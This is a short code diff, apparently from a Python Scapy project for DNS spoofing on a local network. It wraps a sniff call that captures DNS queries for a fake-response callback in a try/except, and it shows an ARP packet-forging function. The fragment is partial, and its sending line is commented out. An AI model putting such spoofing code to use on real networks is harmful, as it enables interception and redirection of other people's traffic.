@@ -17,8 +17,10 @@ def sendFakeDNS(pkt):
     #•send(dnsResPacket)
 
 def DNSSpoofing(iptarget):
-   sniff(filter="udp and port 53", prn=sendFakeDNS, count=1)
-
+    try :
+        sniff(filter="udp and port 53", prn=sendFakeDNS, count=1)
+    except :
+        print("rien")
 
 def restorearp(targetip, targetmac, sourceip, sourcemac):
     packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
